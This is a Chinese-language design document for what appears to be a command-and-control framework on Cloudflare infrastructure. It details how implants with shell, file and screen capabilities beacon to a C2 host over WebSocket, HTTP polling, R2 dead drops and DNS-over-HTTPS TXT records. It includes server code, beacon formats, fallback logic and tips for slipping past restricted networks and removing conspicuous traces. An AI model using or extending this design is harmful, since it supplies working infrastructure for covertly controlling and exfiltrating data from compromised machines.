# 02-04 · 传输通道设计（WS 主通道 / 批量轮询 / R2 死信箱 / DoH 兜底）

> 所有通道共用同一套 [L1 信封](../03-protocol/01-envelope.md) 与 L2 密文；通道只是"搬运方式"。
> 通道由植入体配置决定（`transport = ws | http | r2 | doh`），服务端不强制、也不需要知道。

---

## 1. 通道对比

| 通道 | 实时性 | 上行成本 | 下行成本 | 适用 | 主要风险 |
|---|---|---|---|---|---|
| **WSS**（DO hibernation） | 立即 | DO 请求（消息 20:1） | 出站消息免费 | 默认 | 中间设备断长连；运行时代码更新断连（20 min grace） |
| **HTTP 批量轮询** | ≤ 轮询间隔 | Workers 请求 + DO 请求 | 同上 | WS 被阻断 | 请求额度（100k/天）迅速耗尽 |
| **R2 死信箱** | 慢（分钟级） | Class B 读 | Class A 写 | 只能出站、不能长连 | 需要植入体持 R2 凭据 → 凭据泄露面变大（不推荐） |
| **DoH TXT** | 很慢（受 TTL） | DNS 查询 | DNS 查询 | 极端受限网络 | 只做控制面；CF API 限速 1,200 req/5 min |

**选择建议（写进植入体默认配置）**：`ws` 优先，连续 3 次建连失败后降级 `http`（间隔自动拉长到 5 min），见 §6。

---

## 2. WSS 主通道

### 2.1 建立

```
GET https://c2.example.com/v1/ws/beacon HTTP/1.1
Upgrade: websocket
Authorization: Bearer <session_token>
X-STC2-V: 1
X-STC2-Caps: shell,file,screen
```

服务端：`edge` 校验头部 → `stub.fetch()` 到 `SessionDO(sid)` → DO 内 `ctx.acceptWebSocket(server)` → 101。
**注意**：校验必须在 Worker 里做完再进 DO（DO 请求也计费），无效请求不要打 DO。

```ts
// workers/gateway/src/index.ts（节选）
app.get('/v1/ws/beacon', async (c) => {
  const auth = await verifySession(c);          // ≤ 1 ms
  if (!auth) return new Response(null, { status: 401 });
  const stub = c.env.SESSION.get(c.env.SESSION.idFromName(auth.sid));
  return stub.fetch(c.req.raw);                 // DO 内 acceptWebSocket
});
```

### 2.2 生命周期与 hibernation

| 阶段 | 行为 | 计费 |
|---|---|---|
| 建连 | `acceptWebSocket(server)` + `serializeAttachment({sid, role:'implant'})` | 1 次请求 |
| 空闲 | DO 从内存驱逐，连接**保持在 CF 网络**上 | **0** |
| 收到消息 | 运行时重新构造 DO（`constructor` 会再跑）→ `webSocketMessage()` | 1 次请求 |
| 协议 ping | 运行时自动回 pong，**不唤醒 DO** | 0 |
| 关闭 | `webSocketClose()` 写一次 `last_seen` | 1 次请求 |

**构造函数必须极简**（hibernation 每次唤醒都会跑）：只做 `this.sql = ctx.storage.sql` 这类赋值，**不要**在构造里查 D1。

### 2.3 帧处理（DO 侧伪代码）

```ts
async webSocketMessage(ws: WebSocket, msg: ArrayBuffer | string) {
  const a = ws.deserializeAttachment() as { role: 'implant' | 'operator'; sid: string };
  if (a.role === 'implant') {
    const f = decodeFrame(msg);                     // 只解析 L1 头
    if (!this.checkSeq(f.seq)) return this.drop(ws, 'replay');
    if (f.t === 'hb')  return ws.send(encode({ t: 'hb_ack', seq: ++this.seqOut }));
    if (f.t === 'res') { this.persistMeta(f); this.broadcast(a.sid, msg); }  // 原样转发密文
    if (f.t === 'io')  this.broadcast(a.sid, msg);
    if (f.t === 'ack') this.ackTask(f.meta.tid);
  } else {
    // operator 帧：入队 + (在线则)直投
    this.enqueue(msg);
    this.toImplant(msg);
  }
}
```

**三条硬规则**

1. **`broadcast` 不解密、不改写**密文——这是零知识与 CPU 预算的共同要求。
2. **`checkSeq` 先于一切**（防重放），失败直接 `close(1008)` 并计数。
3. **写 D1 只在 `webSocketClose` 或每 N 帧合并一次**；不要每帧写库。

### 2.4 自动应答（省 duration 的利器）

```ts
// 心跳类消息用自动应答，完全不唤醒 DO、不计 duration
ctx.setWebSocketAutoResponse(
  new WebSocketRequestResponsePair('{"t":"ping"}', '{"t":"pong"}')
);
```

植入体的**纯心跳**走这个（60 s 一次），业务帧才唤醒 DO。这一条能把"100 台在线一天"的 DO 请求从 14.4 万降到接近 0。

> 限制：自动应答只做**字面量匹配**，所以植入体的心跳必须是**固定字节串**（不带时间戳/sid）。要带时间戳就得进 `webSocketMessage`——两者不可兼得，我们的选择是"心跳固定串 + 每 15 min 一次带时间戳的业务心跳"。

### 2.5 操作员侧连接

- 操作员先连 `HubDO`（`/api/v1/ws`）拿"会话列表变化"事件，再对**具体会话**连 `/api/v1/ws/session/:id`（→ `SessionDO`）。
- 同一 `SessionDO` 可挂多个 operator WS（协作），`broadcast` 时逐个 `send()`，**慢消费者直接丢帧并计数**（不要背压阻塞，会拖垮 DO）。
- 操作员 WS 的 `deserializeAttachment` 里存 `{role:'operator', operatorId, keyId}`，用于审计与权限判定。

---

## 3. HTTP 批量轮询（兜底）

```
POST /v1/beacon
Authorization: Bearer <session_token>
Content-Type: application/json

{ "v":1, "sid":"...", "seq":1234,
  "up":   [ {t:"hb",seq:1234}, {t:"res",seq:1235,n:"...",ct:"...",meta:{...}} ],
  "ack":  ["tid1","tid2"] }
```

响应：

```jsonc
{ "v":1, "seq":1236,
  "down": [ {t:"cmd",seq:1237,n:"...",ct:"...",meta:{tid:"...",cat:"exec"}} ],
  "next": 300 }          // 建议下次轮询间隔（秒）
```

**服务端行为**

- `up` 里每个帧走与 WS 相同的 `SessionDO` 逻辑（`/v1/beacon` 也是 `stub.fetch()` 到 DO）。
- `down` 最多回 20 帧或 256 KB（先到者为准），避免响应过大。
- `next` 由服务端按配额水位动态给：正常 300 s；检测到 DO 请求接近日限额时退到 900 s，并在响应头 `X-STC2-Throttle: 1` 告知客户端。

**成本**：一台机器 5 分钟一次 = 288 请求/天；**100 台 = 28,800 请求/天**，占免费额度的 29%。这是"能接受的降级"，而 30 秒轮询（288,000/天）不可接受。

---

## 4. R2 死信箱（可选，谨慎）

**不推荐默认启用**：植入体要拿 R2 凭据，等于把存储账号的一部分交给植入体。

如果确实需要（目标网络只允许出站、且不能长连），做法：

1. console 生成 **scoped R2 token**（只允许 `env/drop/{sid}/*` 前缀，短期有效）。
2. 植入体 `GET {bucket}/{sid}/inbox/{seq}.bin` 取任务（Class B），`PUT {bucket}/{sid}/outbox/{seq}.bin` 交结果（Class A）。
3. 轮询间隔 ≥ 60 s；服务端用 Cron 清理 24 h 前的对象。

代价：R2 Class B 10M/月 ÷ 每台每天 1,440 次 = 大约 **6,900 台·天**，看起来够用；但 Class A 1M/月 在"每秒一次结果"时会很快耗尽。

---

## 5. DoH TXT 兜底（控制面）

**目标**：当目标网络只放行 DNS 时，仍能取到"下一步指令"（不能传文件）。

**写入**（console worker，需要 CF API Token，权限限定 `Zone.DNS:Edit` + 指定 zone）：

```ts
await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/dns_records`, {
  method: 'POST',
  headers: { Authorization: `Bearer ${env.CF_DNS_TOKEN}`, 'Content-Type': 'application/json' },
  body: JSON.stringify({
    type: 'TXT',
    name: `t${seq}.k1.c2.example.com`,   // 名字里带序号
    content: `v=1;n=${nonce};ct=${ctB64}`, // 单条 ≤ 255 字节，超长要拆多条
    ttl: 60,
  }),
});
```

**读取**（植入体，用公共 DoH）：

```
GET https://1.1.1.1/dns-query?name=t42.k1.c2.example.com&type=TXT
Accept: application/dns-json
```

**限制（必须写进 UI 提示）**

- 单条 TXT ≤ 255 字节（实际可用 ~200），一条命令要拆多条 → 序号与重组由客户端做。
- DNS 缓存：TTL 60 s 起，递归解析器可能更久；**端到端延迟 1–5 分钟**。
- CF API 限速 1,200 请求 / 5 分钟（账号级）→ **每天最多约 34 万次写**，但实际建议 ≤ 100 次/天（别把账号玩死）。
- 记录要在用完后删除（Cron），否则 zone 里会堆几千条 TXT，**非常显眼**。

> 结论：DoH 通道做成"**紧急单向下发**"（下发一条短命令，结果走 HTTP 回传），不做双向。

---

## 6. 降级与重连策略（植入体侧规范）

```
启动
 ├─ 读配置：transport_priority = [ws, http]
 ├─ 随机抖动 sleep(0..jitter)
 ├─ 尝试 ws：如果 3 次连续失败（指数退避 5s/15s/45s）
 │     └─ 降级 http，间隔 300s，连续 6 次成功后回到 ws
 ├─ 任何通道 401/403 → 立即停止（PSK 被吊销），清内存密钥
 ├─ 任何通道 1027/1102（Cloudflare 层）→ 视为"基础设施过载"，间隔 ×3
 └─ 网络错误 → 保持退避，最长 30 min 后重置为初始间隔
```

**服务端配合**：`register` 响应里带 `next_hint`（建议间隔），并在 `429` 时带 `Retry-After`。

---

## 7. 通道注册表（代码结构）

`packages/shared/src/channels.ts`：

```ts
export const CHANNELS = {
  ws:   { realtime: true,  maxFrame: 1 << 20, needs: ['SESSION'] },
  http: { realtime: false, maxFrame: 1 << 20, needs: ['SESSION'] },
  r2:   { realtime: false, maxFrame: 8 << 20, needs: ['R2'] },
  doh:  { realtime: false, maxFrame: 200,     needs: ['CF_DNS_TOKEN'] },
} as const;
```

gateway 的路由按注册表挂载：没有配置 `CF_DNS_TOKEN` 时 `/v1/doh/*` 直接 404（**fail-closed**，不是"返回空"）。

---

## 8. 已知问题与取舍

| 问题 | 现状 | 缓解 |
|---|---|---|
| 运行时更新会断 WS（20 min grace） | 无法避免 | 植入体重连 + `seq` 续传；控制台显示"最近断连原因" |
| 中间设备掐长连 | 常见 | 心跳 60 s + 自动应答；WS 失败降级 HTTP |
| DO 单线程 | 一个会话的帧串行处理 | 单会话内不做重活；批量帧一次处理 |
| 消息过多导致 DO 过载 | 官方明确提示 | 客户端 50–100 ms 合批；服务端对慢消费者丢帧 |
| DoH 通道延迟大 | DNS 缓存 | UI 上明确标注"该通道延迟 1–5 分钟" |
